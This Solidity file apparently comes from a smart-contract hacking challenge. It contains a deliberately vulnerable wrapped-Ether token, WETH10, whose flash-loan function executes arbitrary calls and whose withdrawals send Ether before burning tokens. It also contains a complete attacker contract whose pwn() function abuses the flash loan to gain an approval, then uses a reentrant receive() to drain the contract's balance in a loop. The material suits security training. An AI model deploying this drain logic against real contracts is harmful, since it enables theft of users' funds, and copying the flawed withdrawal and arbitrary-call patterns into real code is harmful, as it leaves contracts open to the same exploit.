// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.8.0;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";

// The Messi Wrapped Ether
contract WETH10 is ERC20("Messi Wrapped Ether", "WETH10"), ReentrancyGuard {
  receive() external payable {
    deposit();
  }

  function _burnAll() internal {
    _burn(msg.sender, balanceOf(msg.sender));
  }

  function deposit() public payable nonReentrant {
    _mint(msg.sender, msg.value);
  }

  function withdraw(uint256 wad) external nonReentrant {
    Address.sendValue(payable(msg.sender), wad);
    _burn(msg.sender, wad);
  }

  function withdrawAll() external nonReentrant {
    Address.sendValue(payable(msg.sender), balanceOf(msg.sender));
    _burnAll();
  }

  /// @notice Request a flash loan in ETH
  function execute(address receiver, uint256 amount, bytes calldata data) external nonReentrant {
    uint256 prevBalance = address(this).balance;
    Address.functionCallWithValue(receiver, data, amount);

    require(address(this).balance >= prevBalance, "flash loan not returned");
  }
}

contract WETH10Attacker {
  WETH10 immutable weth10;
  address immutable target;
  address immutable bob;

  bool ispwning;

  constructor(address targetAddress) {
    weth10 = WETH10(payable(targetAddress));
    bob = address(this);
    target = targetAddress;
  }

  function min(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a < b) {
      return a;
    }
    return b;
  }

  function pwn() external {
    // take 0-amount flash loan, approving many many tokens to the user
    weth10.execute(target, 0, abi.encodeWithSignature("approve(address,uint256)", [uint256(uint160(bob)), 9999 ether]));

    while (target.balance != 0) {
      // commence attack with min(yourBalance, targetBalance)
      uint256 amount = min(bob.balance, target.balance);

      // deposit WETH
      weth10.deposit{value: amount}();

      // withdraw WETH, will enter `receive`
      ispwning = true;
      weth10.withdrawAll();
      ispwning = false;

      // transferFrom back your WETH10
      weth10.transferFrom(target, bob, amount);

      // withdraw for real to get extra ETH for your WETH10
      weth10.withdrawAll();
    }
  }

  receive() external payable {
    if (ispwning) {
      // send WETH10 back to the pool, before burning happens
      weth10.transfer(target, msg.value);
    }
  }
}
